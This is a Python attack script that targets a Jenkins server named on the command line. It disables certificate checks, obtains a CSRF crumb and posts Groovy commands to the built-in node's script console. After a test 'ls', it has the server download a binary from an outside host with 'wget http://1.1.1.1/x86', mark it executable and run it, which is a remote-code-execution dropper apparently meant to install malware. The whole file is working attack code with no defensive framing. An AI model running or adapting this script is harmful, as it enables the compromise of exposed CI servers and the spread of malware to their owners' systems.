import requests
import re
import sys

url = "https://"+sys.argv[1]
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Open a session
with requests.Session() as session:
    # Make a GET request to the initial URL
    response = session.get(url,verify=False)
    
    def get_jenkins_crumb(session, jenkins_url):
            crumb_url = f"{jenkins_url}/crumbIssuer/api/json"
            response = session.get(crumb_url)

            if response.status_code == 200:
                crumb_data = response.json()
                return crumb_data.get("crumb")

            return None, None
    def get_jenkins_session_id(session, jenkins_url):
        try:
            # Make a GET request to the Jenkins server
            response2 = session.get(jenkins_url,verify=False)

            # Check if the request was successful (status code 200)
            if response2.status_code == 200:
                # Extract the JSESSIONID from the response headers
                cookie_header = response.headers.get('Set-Cookie', '')
                session_id = cookie_header.split(';')[0]

                
                if session_id:
                    print(f"Successfully obtained JSESSIONID: {session_id}")
                    return session_id
                else:
                    print("JSESSIONID not found in the response headers.")
            else:
                print(f"Failed to get JSESSIONID. Status code: {response.status_code}")

        except Exception as e:
            print(f"An error occurred: {str(e)}")

        return None

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        print("Successfully opened:", url)
        session_id = get_jenkins_session_id(session, ""+url)
        # Change to the manage URL
        manage_url = f"{url}/manage/"
        response_manage = session.get(manage_url,verify=False)

        # Check if the request to manage URL was successful (status code 200)
        if response_manage.status_code == 200:
            print("Successfully changed to:", manage_url)
            compua = f"{url}/manage/computer/"
            response_manage_com = session.get(manage_url,verify=False)
            if response_manage_com.status_code == 200:
                print("Successfully changed to:", compua)
                inbuilt = f"{url}/manage/computer/(built-in)/"
                response_manage_com_inbuilt = session.get(inbuilt,verify=False)
                if response_manage_com_inbuilt.status_code == 200:
                    print("Successfully changed to:", response_manage_com_inbuilt.status_code)
                    console = f"{url}/computer/(built-in)/script"
                    response_console = session.get(console,verify=False)
                    crumb = get_jenkins_crumb(session, ""+url)
                    session_id = get_jenkins_session_id(session, ""+url)
                    if response_console.status_code == 200 and crumb:
                        print("Successfully")
                        send = f"{url}/computer/(built-in)/script"
                        headerwes = {
                                    'Host': f'{url}',
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                                    'Accept-Encoding': 'gzip, deflate',
                                    'Accept-Language': 'de-DE,de',
                                    'Cache-Control': 'max-age=0',
                                    'Connection': 'keep-alive',
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                    'Origin': f'{url}',
                                    'Referer': f'{url}',
                                    'Upgrade-Insecure-Requests': '1',
                                    'Sec-GPC': '1',
                                    'Cookie': f'{session_id}; SoundsAgentActionDescriptorVersion=0',
                                }

                        r = session.get(f"{url}/crumbIssuer/api/json",verify=False)
                        json = r.json()
                        crumb = {json['crumbRequestField']: json['crumb']}
                        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                        headers.update(crumb)
                        payload = {
                                    "script": 'println "ls".execute().text',
                                    "Submit": "",
                                    "Jenkins-Crumb": '"'+json['crumb']+'"',
                                }

                        response_send = session.post(send, data=payload, headers=headers,verify=False)
                        print(response_send.text)
                        if response_send.status_code == 200:
                            mi = response_send.text
                            if mi:
                                if "config.xml" in mi:
                                    payload2 = {
                                        "script": 'println "wget http://1.1.1.1/x86".execute().text',
                                        "Submit": "",
                                        "Jenkins-Crumb": '"'+json['crumb']+'"',
                                    }
                                    response_send2 = session.post(send, data=payload2, headers=headers,verify=False)
                                    if response_send2.text:
                                        payload3 = {
                                        "script": 'println "chmod 777 x86".execute().text',
                                        "Submit": "",
                                        "Jenkins-Crumb": '"'+json['crumb']+'"',
                                        }
                                        response_send3 = session.post(send, data=payload3, headers=headers,verify=False)
                                        if response_send3.text:
                                            payload4 = {
                                            "script": 'println "./x86".execute().text',
                                            "Submit": "",
                                            "Jenkins-Crumb": '"'+json['crumb']+'"',
                                            }
                                            response_send4 = session.post(send, data=payload4, headers=headers,verify=False)

                            #print(response_send.text)
        else:
            print("Failed to open:", manage_url)

    else:
        print("Failed to open:", url)
